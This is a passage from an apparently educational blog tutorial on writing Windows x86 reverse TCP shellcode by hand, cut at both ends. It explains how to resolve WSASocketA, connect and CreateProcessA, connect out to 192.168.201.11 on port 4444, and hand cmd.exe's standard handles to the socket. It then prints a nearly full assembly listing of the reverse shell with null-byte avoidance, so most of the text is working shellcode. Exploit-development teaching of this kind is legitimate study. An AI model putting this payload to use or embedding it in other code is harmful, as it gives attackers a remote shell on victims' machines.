In order to avoid the null bytes, we should first add the hex value <code  style="background-color: lightgrey; color:black;"><b>0x4</b></code> at the lower <code  style="background-color: lightgrey; color:black;"><b>BL</b></code> register. Afterwards, we multiply <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> with <code  style="background-color: lightgrey; color:black;"><b>0x64</b></code> and finally <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> has the hex value <code  style="background-color: lightgrey; color:black;"><b>0x190</b></code>. This way we have avoided the null bytes. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
nasm > add BL, 0x4
00000000  80C304            add bl,0x4
nasm > imul EBX, 0x64
00000000  6BDB64            imul ebx,ebx,byte +0x64
</pre>

<p align="justify">
Then, we add the <code  style="background-color: lightgrey; color:black;"><b>ESP</b></code> register with <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> which sets the value of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> at the <code  style="background-color: lightgrey; color:black;"><b>EDX</b></code> register. Furthermore, at lines 6-9 we are pushing on the stack the string <b>"At"</b>, then the <b>"ekco"</b> and then the <b>"SASW"</b> in reverse order because of the little endian format. After that, at the tenth line, <code  style="background-color: lightgrey; color:black;"><b>ESP</b></code> is pointing at the begining of <b>"WSASocketA"</b> and this is the second argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code>. Furthermore, at lines 11-12, we want to push the first argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> on the stack. In order to do this, the <code  style="background-color: lightgrey; color:black;"><b>EDI</b></code> register which holds <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> address, will be moved in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register. Then we call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code>. At this point, after we call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> with <code  style="background-color: lightgrey; color:black;"><b>call edx</b></code> instruction, we have the address of <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register. Next, as seen at the screenshot below, observing the registers, we see that the address of the <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library is located at the <code  style="background-color: lightgrey; color:black;"><b>edi</b></code> register.
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/08/edi_.png" alt="ws2_32_on_EDI "/>

<p align="justify">
Now, we <code  style="background-color: lightgrey; color:black;"><b>push edi</b></code> in order to save the address of <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library on the stack for later use. 
</p>

<b><span style="color:green;font-size:26px">Call the WSASocketA function</span></b>

<p align="justify">
Now that we know the address of <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function, it is time to call and execute the function. Acording to Microsoft Docs, the function prototype of the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> is the following 
</p>

```c
SOCKET WSAAPI WSASocketA(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);
```

Function parameters : 

>af

* The address family specification.

>type

* The type specification for the new socket.

>protocol

* The protocol to be used.

> lpProtocolInfo

* A pointer to a <code  style="background-color: lightgrey; color:black;"><b>WSAPROTOCOL_INFO</b></code> structure that defines the characteristics of the socket to be created. 

>g

* An existing socket group ID or an appropriate action to take when creating a new socket and a new socket group.


>dwFlags

* A set of flags used to specify additional socket attributes.

<p align="justify">

This function creates a socket. The following arguments passed to the function
</p>

<ul>
  <li>2 == AF_INET (IPv4)</li>
  <li>1 == SOCK_STREAM (TCP)</li>
  <li>6 == IPPROTO_TCP (TCP)</li>
  <li>NULL == no value for lpProtocolInfo</li>
  <li>0 == since we don't have an existing "socket group"</li>
  <li>NULL == no value for dwFlags</li>
</ul>

<p align="justify">
 The following assembly code implements the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function 
</p>

```c
;call WSASocketA
XOR ECX, ECX       ;zero out ECX register 
PUSH EDX           ;null value for dwFlags                                    
PUSH EDX           ;zero value since we dont have an existing socket group
PUSH EDX           ;null value for lpProtocolInfo
MOV  DL, 0x6       ;IPPROTO_TCP
PUSH EDX           
INC  ECX           ;SOCK_STREAM (TCP)
PUSH ECX
INC  ECX           ;AF_INET (IPv4)
PUSH ECX   
CALL EAX           ;call WSASocketA
XCHG EAX, ECX      ;save socket descriptor into ecx in orddr to use it later

```

<p align="justify">
At the first line we zero out <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> register, and after that because we dont need additional socket attributes, we set the <code  style="background-color: lightgrey; color:black;"><b>dwFlags</b></code> argument with a null value. At the third line, because we dont want to perform  any socket group operation, we are pushing the zero value on the stack. In the same manner, at the fourth line, we dont need to define characteristics to the new socket, so we are pushing the null value on the stack. Furthermore, at the fifth line, we are setting the protocol to be used. Here we are using <code  style="background-color: lightgrey; color:black;"><b>TCP</b></code>. At lines 6-7, we are setting the type parameter to <code  style="background-color: lightgrey; color:black;"><b>SOCKET_STREAM (TCP)</b></code>. At lines 8-9, we are setting the internet protocol version 4 (IPv4). At the 10th line, we execute <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code>. At the 11th line, we are saving the socket descriptor to <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> register in order to use it later.   
</p>


<b><span style="color:green;font-size:26px">Get connect using GetProcAddress</span></b>

<p align="justify">
At this point we are ready to search for the address of connect function.
</p>

<ul>
  <li><code  style="background-color: lightgrey; color:black;"><b>connect</b></code></li>
</ul>

<p align="justify">
The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function 
</p>

```c
;; Find the address of connect 
POP  EDI                             ;load previously saved ws2_32.dll address to ECX
ADD  ESP, 0x10                       ;Align stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x63                       ;EBX = 0x18c
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61746365                      ;"atce"
SUB  word [ESP + 0x3], 0x61          ;"tce" (remove "a")
PUSH 0x6e6e6f63                      ;"nnoc"
PUSH ESP                             ;"connect", second argument of GetProcAddress
PUSH EDI                             ;ws32_2.dll address, first argument of GetProcAddress
XCHG ECX, EBP                        ;save socket descriptor to EBP registry for later use
CALL EDX                             ;call GetProcAddress                
```

<p align="justify">
At the first line, <code  style="background-color: lightgrey; color:black;"><b>edi</b></code> register has the address of <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code>. At the second line, we are aligning the stack. At lines 3-6, we are getting the address of the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function. At lines 7-9, we are pushing the string, <b>"connect"</b>, in reverse order due to little endian format. At the tenth line, we are pushing the second argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> which is the name of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function. This is done by pushing the <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> register on the stack. Then, we push the first argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> on the stack, which is the <code  style="background-color: lightgrey; color:black;"><b>ws32_2.dll</b></code> address. Afterwards, we are saving the socket descriptor we have aquired earlier into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code> register to use it later. Then we call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> and then the address of <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function will be returned in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register    
</p>

<b><span style="color:green;font-size:26px">Call the connect function</span></b>

<p align="justify">
Next, we implement the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function. According to Microsoft Docs, the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function establishes a connection to a specified socket. 
</p>

<code style="background-color: lightgrey; color:black;"><b>connect</b></code> function prototype :

```c
int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
```

<p align="justify">
Function parameters : 
</p>

> s

* A descriptor identifying an unconnected socket.

> name

* A pointer to the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure to which the connection should be established.

> namelen

* The length, in bytes, of the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure pointed to by the name parameter.

<p align="justify">
The following code implements the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function  
</p>

```c
;call connect
PUSH 0x0bc9a8c0          ;sin_addr set to 192.168.201.11
PUSH word 0x5c11         ;port = 4444
XOR  EBX, EBX            ;zero out EBX
add  BL, 0x2             ;TCP protocol
PUSH word BX             ;push the protocol value on the stack
MOV  EDX, ESP            ;pointer to sockaddr structure (IP,Port,Protocol)
PUSH byte  16            ;the size of sockaddr - 3rd argument of connect
PUSH EDX                 ;push the sockaddr - 2nd argument of connect
PUSH EBP                 ;socket descriptor = 64 - 1st argument of connect
XCHG EBP, EDI            ;save socket descriptor to EDI to use it later
CALL EAX                 ;execute connect;
```

<p align="justify">
At lines 1-6, we are setting the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure ( <code  style="background-color: lightgrey; color:black;"><b>Port</b></code>, <code  style="background-color: lightgrey; color:black;"><b>IP</b></code>, <code  style="background-color: lightgrey; color:black;"><b>Protocol</b></code> ) and then the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register will hold the pointer of <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure. Afterwards, at lines 7-9, we are setting the arguments of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function in reverse order. First we push the size of the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure on the stack, then we push the address of the<code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure on the stack and finally we also push on the stack, the socket descriptor that was saved before into <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code>. Afterwards, before we execute <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function, we save the socket descriptor into <code  style="background-color: lightgrey; color:black;"><b>edi</b></code> for later use. Finally, we call <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function.
</p>


<b><span style="color:green;font-size:26px">Get CreateProcessA using GetProcAddress</span></b>

<p align="justify">
At this point we will search for the address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. 
</p>

<ul>
    <li> <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code></li>
</ul>

<p align="justify">
The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function
</p>

```c
;; Find the address of CreateProcessA
ADD  ESP,0x14                        ;Clean stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x64                       ;EBX = 0x190
MOV  EDX,[ESP+EBX]                   ;EDX has the address of GetProcAddress
PUSH 0x61614173                      ;"aaAs"
SUB  word [ESP + 0x2], 0x6161        ;"As" ( remove "aa")
PUSH 0x7365636f                      ;"seco"
PUSH 0x72506574                      ;"rPet"
PUSH 0x61657243                      ;"aerC"
PUSH ESP                             ;"CreateProcessA" - 2nd argument of GetProcAddress
MOV  EBP, ESI                        ;move the kernel32.dll to EBP
PUSH EBP                             ;kernel32.dll address - 1st argument of GetProcAddress
CALL EDX                             ;execute GetProcAddress
PUSH EAX                             ;address of CreateProcessA
LEA EBP, [EAX]                       ;EBP now points to the address of CreateProcessA
```

<p align="justify">
At the first line we are aligning the stack. Then, at lines 2-5 we are getting the address of the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function. At lines 6-11, we are pushing onto the stack,  the second argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function in reverse order, which sets the string <b>"CreateProcessA"</b>. In order to do that, we are first pushing the string <b>"As"</b>, then <b>"seco"</b>, then <b>"rPet"</b> and finally the string <b>"aerC"</b>. Next, <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> regsister points at the top of the stack at the begining o the string <b>"CreateProcessA"</b>. At line 12, we are moving the <code  style="background-color: lightgrey; color:black;"><b>kernel32.dll</b></code> address that was saved inside <code  style="background-color: lightgrey; color:black;"><b>esi</b></code>, into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code> register. Then at line 13, we are pushing the first argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> into the stack. At line 14, we are calling <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code>. Then, at line 15, the returned address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function will be saved into the stack. Then the address of <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> will be loaded into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code>, which will point to the address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> register. 
</p>


<b><span style="color:green;font-size:26px">Call the CreateProcessA function</span></b>

<p align="justify">
Next, the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function will be implemented. According to Microsoft Docs, the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function creates a new process and its primary thread. The new process runs in the security context of the calling process.
</p>

<p align="justify">
Following we can see the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function prototype 
</p>

```c
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

<p align="justify">
Function parameters :
</p>

>lpApplicationName

* The name of the module to be executed. This module can be a Windows-based application.

>lpCommandLine

* The command line to be executed.

>lpProcessAttributes

* A pointer to a <code  style="background-color: lightgrey; color:black;"><b>SECURITY_ATTRIBUTES</b></code> structure that determines whether the returned handle to the new <b>process</b> object can be inherited by child processes. 

>lpThreadAttributes

* A pointer to a <code  style="background-color: lightgrey; color:black;"><b>SECURITY_ATTRIBUTES</b></code> structure that determines whether the returned handle to the new <b>thread</b> object can be inherited by child processes. 

>bInheritHandles

* If this parameter is <code  style="background-color: lightgrey; color:black;"><b>TRUE</b></code>, each inheritable handle in the calling process is inherited by the new process.


>dwCreationFlags

* The flags that control the priority class and the creation of the process.

>lpEnvironment

* A pointer to the environment block for the new process. If this parameter is NULL, the new process uses the environment of the calling process.


>lpCurrentDirectory

* The full path to the current directory for the process. The string can also specify a UNC path.

>lpStartupInfo

* A pointer to a <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFO</b></code> or <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOEX</b></code> structure.

>lpProcessInformation

* A pointer to a <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structure that receives identification information about the new process.


<p align="justify">
The following code used to impement and call the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function 
</p>

```c
PUSH 0x61646d63                      ;"admc"
SUB  dword [ESP + 0x3], 0x61         ;"dmc" (remove "a")
MOV  ECX, ESP                        ;ecx now points to "cmd" string
```

<p align="justify">
At Lines 1-3 above, the instructions are setting the <code  style="background-color: lightgrey; color:black;"><b>ECX</b></code> register to point to <b>"cmd"</b> string. This is the <code  style="background-color: lightgrey; color:black;"><b>lpProcessInformation</b></code> argument of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code>, and provides the name of the module to be executed
</p>

```c
XOR  EDX, EDX                        ;zero out EDX
SUB  ESP, 16 
MOV  EBX, ESP                        ;pointer for ProcessInfo
```

<p align="justify">
As we see at the code above, at the first line we zero out the <code  style="background-color: lightgrey; color:black;"><b>EDX</b></code> register. At lines 2-3, we are setting the <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> register to point to <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structure.
</p>


```c
PUSH EDI                             ;hStdError  => saved socket
PUSH EDI                             ;hStdOutput => saved socket
PUSH EDI                             ;hStdInput  => saved socket
PUSH EDX                             ;lpReserved2 => NULL 
PUSH EDX                             ;cbReserved2 => NULL
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
ROL  EAX, 8                          ;EAX => 0x00000100
PUSH EAX                             ;dwFlags => STARTF_USESTDHANDLES 0x00000100
PUSH EDX                             ;dwFillAttribute => NULL
PUSH EDX                             ;dwYCountChars => NULL
PUSH EDX                             ;dwXCountChars => NULL
PUSH EDX                             ;dwYSize => NULL
PUSH EDX                             ;dwXSize => NULL
PUSH EDX                             ;dwY => NULL
PUSH EDX                             ;dwX => NULL
PUSH EDX                             ;pTitle => NULL
PUSH EDX                             ;pDesktop => NULL
PUSH EDX                             ;pReserved => NULL
XOR  EAX, EAX                        ;zero out EAX          
ADD  AL, 44                          ;cb => 0x44 (size of struct)
PUSH EAX                             ;eax points to STARTUPINFOA
```

<p align="justify">
Later on, as we see at the code above, we continue setting up the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure. At lines 1-3 above, we are setting up the standard input, the standard output and the standard error by putting the socket file descriptor into the struct members <code  style="background-color: lightgrey; color:black;"><b>hStdInput</b></code>, <code  style="background-color: lightgrey; color:black;"><b>hStdOutput</b></code>, and <code  style="background-color: lightgrey; color:black;"><b>hStdError</b></code>. At the fourth line above, the <code  style="background-color: lightgrey; color:black;"><b>cbReserved2</b></code> is reserved for use by the C run-time and must be zero. Same for <code  style="background-color: lightgrey; color:black;"><b>lpReserved2</b></code> at the fifth line. At lines 6-9, we are setting the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> struct member with the value <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Then, at lines 7-16, All the other values of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure should be null. At seventeenth line, the <code  style="background-color: lightgrey; color:black;"><b>cb</b></code> member holds the size of the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure which is <code  style="background-color: lightgrey; color:black;"><b>0x44</b></code> in hex. Then, at eighteenth line, the <code  style="background-color: lightgrey; color:black;"><b>EAX</b></code> register contains a pointer to <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure
</p>


```c
;;ProcessInfo struct
MOV  EAX, ESP                        ;pStartupInfo
PUSH EBX                             ;pProcessInfo
PUSH EAX                             ;pStartupInfo
PUSH EDX                             ;CurrentDirectory => NULL
PUSH EDX                             ;pEnvironment => NULL
PUSH EDX                             ;CreationFlags => 0
XOR  EAX, EAX                        ;zero out EAX register                    
INC  EAX                             ;EAX => 0x00000001
PUSH EAX                             ;InheritHandles => TRUE => 1
PUSH EDX                             ;pThreadAttributes => NULL
PUSH EDX                             ;pProcessAttributes => NULL
PUSH ECX                             ;pCommandLine => pointer to "cmd"
PUSH EDX                             ;ApplicationName => NULL
CALL EBP                             ;execute CreateProcessA 
```

<p align="justify">
At the code above, we are now starting the setup of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. At lines 1-3 ,we are pushing the pointers of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> and <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structures onto the stack as the two last arguments of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. Afterwards, at lines 4-6 we are setting the next three arguments of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function, the <code  style="background-color: lightgrey; color:black;"><b>CurrentDirectory</b></code>, and the <code  style="background-color: lightgrey; color:black;"><b>pEnvironment</b></code> with nulls, and the <code  style="background-color: lightgrey; color:black;"><b>CreationFlags</b></code> with zero. At lines 7-9 , we are setting the InheritHandles to <code  style="background-color: lightgrey; color:black;"><b>TRUE</b></code>, and that, because the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> was set before with <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Next, at lines 10-11, we are setting the <code  style="background-color: lightgrey; color:black;"><b>pThreadAttributes</b></code> and <code  style="background-color: lightgrey; color:black;"><b>pProcessAttributes</b></code> with null. At line 12, we set the pointer to <b>"cmd"</b>. At line 13 , we set the <code  style="background-color: lightgrey; color:black;"><b>ApplicationName</b></code> to null and then we call <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function.
</p>


<b><span style="color:green;font-size:26px">Full Reverse TCP Shellcode </span></b>

<p align="justify">
The following assembly code represents the code used to perform a reverse tcp socket connection at IP address <code  style="background-color: lightgrey; color:black;"><b>192.168.201.11</b></code> and port <code  style="background-color: lightgrey; color:black;"><b>4444</b></code>
</p>


```c
[BITS 32]

global _start

section .text

_start:

; Locate Kernelbase.dll address
XOR ECX, ECX                    ;zero out ECX
MOV EAX, FS:[ecx + 0x30]        ;EAX = PEB
MOV EAX, [EAX + 0x0c]           ;EAX = PEB->Ldr
MOV ESI, [EAX + 0x14]           ;ESI = PEB->Ldr.InMemoryOrderModuleList
LODSD                           ;memory address of the second list entry structure
XCHG EAX, ESI                   ;EAX = ESI , ESI = EAX
LODSD                           ;memory address of the third list entry structure
XCHG EAX, ESI                   ;EAX = ESI , ESI = EAX
LODSD                           ;memory address of the fourth list entry structure
MOV EBX, [EAX + 0x10]           ;EBX = Base address

; Export Table
MOV EDX, DWORD  [EBX + 0x3C]    ;EDX = DOS->e_lfanew
ADD EDX, EBX                    ;EDX = PE Header
MOV EDX, DWORD  [EDX + 0x78]    ;EDX = Offset export table
ADD EDX, EBX                    ;EDX = Export table
MOV ESI, DWORD  [EDX + 0x20]    ;ESI = Offset names table
ADD ESI, EBX                    ;ESI = Names table
XOR ECX, ECX                    ;EXC = 0

GetFunction :

INC ECX; increment counter
LODSD                                       ;Get name offset
ADD EAX, EBX                                ;Get function name
CMP dword [EAX], 0x50746547                 ;"PteG"
JNZ SHORT GetFunction                       ;jump to GetFunction label if not "GetP"
CMP dword [EAX + 0x4], 0x41636F72           ;"rocA"
JNZ SHORT GetFunction                       ;jump to GetFunction label if not "rocA"
CMP dword [EAX + 0x8], 0x65726464           ;"ddre"
JNZ SHORT GetFunction                       ;jump to GetFunction label if not "ddre"
        
MOV ESI, DWORD [EDX + 0x24]                 ;ESI = Offset ordinals
ADD ESI, EBX                                ;ESI = Ordinals table
MOV CX,  WORD [ESI + ECX * 2]               ;CX = Number of function
DEC ECX                                     ;Decrement the ordinal
MOV ESI, DWORD [EDX + 0x1C]                 ;ESI = Offset address table
ADD ESI, EBX                                ;ESI = Address table
MOV EDX, DWORD [ESI + ECX * 4]              ;EDX = Pointer(offset)
ADD EDX, EBX                                ;EDX = GetProcAddress

; Get the Address of LoadLibraryA function
XOR ECX, ECX                                   ;ECX = 0
PUSH EBX                                       ;Kernel32 base address
PUSH EDX                                       ;GetProcAddress
PUSH ECX                                       ;0
PUSH 0x41797261                                ;"Ayra"
PUSH 0x7262694C                                ;"rbiL"
PUSH 0x64616F4C                                ;"daoL"
PUSH ESP                                       ;"LoadLibrary"
PUSH EBX                                       ;Kernel32 base address
MOV  ESI, EBX                                  ;save the kernel32 address in esi for later
CALL EDX                                       ;GetProcAddress(LoadLibraryA)
                          
ADD ESP, 0xC                                   ;pop "LoadLibraryA"
POP EDX                                        ;EDX = 0
PUSH EAX                                       ;EAX = LoadLibraryA
PUSH EDX                                       ;ECX = 0
MOV DX, 0x6C6C                                 ;"ll"
PUSH EDX                          
PUSH 0x642E3233                                ;"d.23"
PUSH 0x5F327377                                ;"_2sw"
PUSH ESP                                       ;"ws2_32.dll"
CALL EAX                                       ;LoadLibrary("ws2_32.dll")
                          
ADD  ESP, 0x10                                 ;Clean stack
MOV  EDX, [ESP + 0x4]                          ;EDX = GetProcAddress
PUSH 0x61617075                                ;"aapu"
SUB  word [ESP + 0x2], 0x6161                  ;"pu" (remove "aa")
PUSH 0x74726174                                ;"trat"
PUSH 0x53415357                                ;"SASW"
PUSH ESP                                       ;"WSAStartup"
PUSH EAX                                       ;ws2_32.dll address
MOV  EDI, EAX                                  ;save ws2_32.dll to use it later
CALL EDX                                       ;GetProcAddress(WSAStartup)
                          
; Call WSAStartUp                        
XOR  EBX, EBX                                  ;zero out ebx register
MOV  BX, 0x0190                                ;EAX = sizeof(struct WSAData)
SUB  ESP, EBX                                  ;allocate space for the WSAData structure
PUSH ESP                                       ;push a pointer to WSAData structure
PUSH EBX                                       ;Push EBX as wVersionRequested
CALL EAX                                       ;Call WSAStartUp

;Find the address of WSASocketA
ADD  ESP, 0x10                       ;Align the stack
XOR  EBX, EBX                        ;zero out the EBX register
ADD  BL, 0x4                         ;add 0x4 at the lower register BL
IMUL EBX, 0x64                       ;EBX = 0x190
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61614174                      ;"aaAt"
SUB  word [ESP + 0x2], 0x6161        ;"At" (remove "aa")
PUSH  0x656b636f                     ;"ekco"
PUSH  0x53415357                     ;"SASW"
PUSH ESP                             ;"WSASocketA", GetProcAddress 2nd argument
MOV  EAX, EDI                        ;EAX now holds the ws2_32.dll address
PUSH EAX                             ;push the first argument of GetProcAddress
CALL EDX                             ;call GetProcAddress
PUSH EDI                             ;save the ws2_32.dll address to use it later
               
;call WSASocketA               
XOR ECX, ECX                         ;zero out ECX register
PUSH EDX                             ;null value for dwFlags argument
PUSH EDX                             ;zero value since we dont have an existing socket group
PUSH EDX                             ;null value for lpProtocolInfo
MOV  DL, 0x6                         ;IPPROTO_TCP
PUSH EDX                             ;set the protocol argument
INC  ECX                             ;SOCK_STREAM(TCP)
PUSH ECX                             ;set the type argument
INC  ECX                             ;AF_INET(IPv4)
PUSH ECX                             ;set the ddress family specification argument
CALL EAX                             ;call WSASocketA
XCHG EAX, ECX                        ;save the socket returned from WSASocketA at EAX to ECX in order to use it later
               
;Find the address of connect
POP  EDI                             ;load previously saved ws2_32.dll address to ECX
ADD  ESP, 0x10                       ;Align stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x63                       ;EBX = 0x18c
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61746365                      ;"atce"
SUB  word [ESP + 0x3], 0x61          ;"tce" (remove "a")
PUSH 0x6e6e6f63                      ;"nnoc"
PUSH ESP                             ;"connect", second argument of GetProcAddress
PUSH EDI                             ;ws32_2.dll address, first argument of GetProcAddress
XCHG ECX, EBP
CALL EDX                             ;call GetProcAddress

;call connect
PUSH 0x0bc9a8c0                      ;sin_addr set to 192.168.201.11
PUSH word 0x5c11                     ;port = 4444
XOR  EBX, EBX                        ;zero out EBX
add  BL, 0x2                         ;TCP protocol
PUSH word BX                         ;push the protocol value on the stack
MOV  EDX, ESP                        ;pointer to sockaddr structure (IP,Port,Protocol)
PUSH byte  16                        ;the size of sockaddr - 3rd argument of connect
PUSH EDX                             ;push the sockaddr - 2nd argument of connect
PUSH EBP                             ;socket descriptor = 64 - 1st argument of connect
XCHG EBP, EDI
CALL EAX                             ;execute connect;

;Find the address of CreateProcessA
ADD  ESP, 0x14                       ;Clean stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x62                       ;EBX = 0x194
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61614173                      ;"aaAs"
SUB  dword [ESP + 0x2], 0x6161       ;"As"
PUSH 0x7365636f                      ;"seco"
PUSH 0x72506574                      ;"rPet"
PUSH 0x61657243                      ;"aerC"
PUSH ESP                             ;"CreateProcessA" - 2nd argument of GetProcAddress
MOV  EBP, ESI                        ;move the kernel32.dll to EBP
PUSH EBP                             ;kernel32.dll address - 1st argument of GetProcAddress
CALL EDX                             ;execute GetProcAddress
PUSH EAX                             ;address of CreateProcessA
LEA EBP, [EAX]                       ;EBP now points to the address of CreateProcessA

;call CreateProcessA
PUSH 0x61646d63                      ;"admc"
SUB  word [ESP + 0x3], 0x61          ;"dmc" ( remove a)
MOV  ECX, ESP                        ;ecx now points to "cmd" string
XOR  EDX, EDX                        ;zero out EDX
SUB  ESP, 16
MOV  EBX, esp                        ;pointer for ProcessInfo

;STARTUPINFOA struct
PUSH EDI                             ;hStdError  => saved socket
PUSH EDI                             ;hStdOutput => saved socket
PUSH EDI                             ;hStdInput  => saved socket
PUSH EDX                             ;lpReserved2 => NULL
PUSH EDX                             ;cbReserved2 => NULL
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
ROL  EAX, 8                          ;EAX => 0x00000100
PUSH EAX                             ;dwFlags => STARTF_USESTDHANDLES 0x00000100
PUSH EDX                             ;dwFillAttribute => NULL
PUSH EDX                             ;dwYCountChars => NULL
PUSH EDX                             ;dwXCountChars => NULL
PUSH EDX                             ;dwYSize => NULL
PUSH EDX                             ;dwXSize => NULL
PUSH EDX                             ;dwY => NULL
PUSH EDX                             ;dwX => NULL
PUSH EDX                             ;pTitle => NULL
PUSH EDX                             ;pDesktop => NULL
PUSH EDX                             ;pReserved => NULL
XOR  EAX, EAX                        ;zero out EAX
